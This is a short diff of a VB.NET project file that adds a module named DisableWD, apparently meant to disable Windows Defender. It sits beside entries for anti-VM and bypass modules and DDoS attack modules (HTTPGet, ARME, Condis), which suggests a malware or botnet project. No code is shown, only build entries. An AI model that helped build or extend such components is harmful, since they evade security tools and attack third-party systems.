@@ -68,6 +68,7 @@
   <ItemGroup>
     <Compile Include="Antis\ByPassSCP.vb" />
     <Compile Include="Antis\AntiVM.vb" />
+    <Compile Include="Antis\DisableWD.vb" />
     <Compile Include="DDOS\ARME.vb" />
     <Compile Include="DDOS\HTTPGet.vb" />
     <Compile Include="DDOS\Condis.vb" />
